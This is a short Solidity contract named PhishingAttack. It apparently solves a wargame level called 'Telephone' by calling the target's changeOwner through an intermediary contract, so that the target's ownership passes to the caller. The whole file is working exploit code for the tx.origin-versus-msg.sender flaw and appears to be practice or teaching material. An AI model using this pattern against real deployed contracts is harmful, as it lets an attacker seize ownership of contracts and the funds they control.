// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ITelephone} from "./ITelephone.sol";

contract PhishingAttack {
    address public owner;
    ITelephone telephone;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setTelephoneInstance(address _address) external onlyOwner {
        telephone = ITelephone(_address);
    }

    function attack() external onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}